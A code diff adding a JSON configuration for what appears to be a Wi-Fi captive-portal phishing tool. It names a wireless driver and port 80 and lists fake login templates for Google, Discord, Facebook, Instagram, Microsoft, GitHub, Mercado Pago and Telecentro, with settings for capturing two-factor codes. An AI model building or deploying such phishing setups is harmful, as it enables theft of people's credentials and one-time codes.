@@ -1,0 +1,100 @@
+{
+    "scriptVersion": "1",
+    "v": "1.0",
+    "driver": "nl80211",
+    "local_port": "80",
+    "templates_with_only_one_data": ["mercado_pago"],
+    "templates": [
+        {
+            "name": "old_google",
+            "language": "multiple",
+            "mobile": false,
+            "2fa": {
+                "enabled": true,
+                "method": 1,
+                "force_2fa_mode": false
+            }
+        },
+        {
+            "name": "discord",
+            "language": "multiple",
+            "mobile": true,
+            "2fa": {
+                "enabled": false,
+                "method": "None",
+                "force_2fa_mode": false
+            }
+        },
+        {
+            "name": "facebook",
+            "language": "multiple",
+            "mobile": true,
+            "2fa": {
+                "enabled": false,
+                "method": "None",
+                "force_2fa_mode": false
+            }
+        },
+        {
+            "name": "instagram",
+            "language": "multiple",
+            "mobile": false,
+            "2fa": {
+                "enabled": true,
+                "method": 2,
+                "force_2fa_mode": false
+            }
+        },
+        {
+            "name": "microsoft",
+            "language": "multiple",
+            "mobile": false,
+            "2fa": {
+                "enabled": true,
+                "method": 2,
+                "force_2fa_mode": false
+            }
+        },
+        {
+            "name": "github",
+            "language": "multiple",
+            "mobile": false,
+            "2fa": {
+                "enabled": true,
+                "method": 3,
+                "force_2fa_mode": false
+            }
+        },
+        {
+            "name": "mercado_pago",
+            "language": "es",
+            "mobile": false,
+            "2fa": {
+                "enabled": true,
+                "method": 2,
+                "force_2fa_mode": true
+            }
+        },
+        {
+            "name": "telecentro",
+            "language": "es",
+            "mobile": false,
+            "2fa": {
+                "enabled": false,
+                "method": "None",
+                "force_2fa_mode": false
+            }
+        },
+        {
+            "name": "telecentro_wifi",
+            "language": "es",
+            "mobile": false,
+            "2fa": {
+                "enabled": false,
+                "method": "None",
+                "force_2fa_mode": false
+            }
+        }
+        
+    ]
+}
